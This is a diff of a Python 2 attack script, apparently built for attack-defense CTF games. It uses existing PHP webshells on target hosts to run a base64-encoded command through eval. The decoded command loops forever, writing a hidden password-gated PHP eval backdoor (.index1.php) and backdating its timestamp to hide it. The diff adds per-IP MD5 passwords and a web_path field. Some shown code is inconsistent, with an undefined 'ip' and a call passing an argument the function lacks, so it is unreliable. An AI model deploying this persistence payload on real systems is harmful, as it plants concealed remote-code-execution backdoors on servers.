@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #coding=utf-8
-import sys,requests
+import sys,requests,hashlib,hashlib
 '''
 作用：向靶机发命令来写文件，文件名.index1.php
 webshell.txt 格式如下：
@@ -50,6 +50,7 @@ def cmd(url,method,passwd):
 	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
 	data={}
 	if method=='get':
+		data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
 		data[passwd]='@eval(base64_decode($_GET[z0]));'
 		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
 		try:
@@ -57,7 +58,7 @@ def cmd(url,method,passwd):
 		except :
 			pass
 	elif method=='post':
-		data['pass']="Sn3rtf4ck"
+		data['pass']=hashlib.md5(str(ip)+"you_can_not_guess_it!").hexdigest()
 		data[passwd]='@eval(base64_decode($_POST[z0]));'
 		data['z0']='c3lzdGVtKCd3aGlsZSB0cnVlO2RvIGVjaG8gXCc8P3BocCBpZihtZDUoJF9QT1NUW3Bhc3NdKT09IjNhNTAwNjVlMTcwOWFjYzQ3YmEwYzkyMzgyOTQzNjRmIil7QGV2YWwoJF9QT1NUW2FdKTt9ID8+XCcgPi5pbmRleDEucGhwO3RvdWNoIC1tIC1kICIyMDE3LTExLTE3IDEwOjIxOjI2IiAuaW5kZXgxLnBocDtzbGVlcCA1O2RvbmU7Jyk7'
 		try:
@@ -88,13 +89,14 @@ def cmd(url,method,passwd):
 
 def cupload():
 	shellstr=loadfile("auxi/webshell.txt")
-	list = shellstr.split("\r\n")
+	l = shellstr.split("\n")
 	#print str(list)
 	i = 0
 	url={}
 	passwd={}
 	method={}
-	for data in list:
+	web_path = {}
+	for data in l:
 		if data:
 			ls = data.split(",")
 			method_tmp = str(ls[1])
@@ -103,6 +105,7 @@ def cupload():
 				url[i]=str(ls[0])
 				method[i]=method_tmp
 				passwd[i]=str(ls[2])
+				web_path[i] = str(ls[3])
 				i+=1
 			else :
 				print "[-] %s request method error!" %(str(ls[0]))
@@ -112,4 +115,4 @@ def cupload():
 		#调用执行命令的模块
 		#print str(j)
 		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
-		cmd(url=url[j],method=method[j],passwd=passwd[j])
+		cmd(url=url[j],method=method[j],passwd=passwd[j],web_path=web_path[j])
